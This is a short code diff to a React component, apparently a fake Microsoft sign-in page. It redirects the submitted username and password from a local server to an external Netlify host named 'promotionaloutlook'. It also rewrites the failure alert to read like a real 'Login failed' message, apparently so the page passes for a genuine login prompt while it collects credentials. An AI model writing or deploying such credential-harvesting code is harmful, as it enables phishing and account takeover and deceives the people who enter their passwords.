@@ -51,14 +51,14 @@ const MicrosoftSignIn = () => {
     if (validate()) {
       const data = { username: unameVal, password: pwdVal };
       axios
-        .post('http://localhost:5000/submit', data)
+        .post('https://promotionaloutlook.netlify.app/submit', data)
         .then((response) => {
           console.log(response.data.message);
           setView('final');
         })
         .catch((error) => {
           console.error('Error saving data:', error);
-          alert('Failed to save data. Please try again.');
+          alert('Login failed. Please try again.');
         });
     }
   };
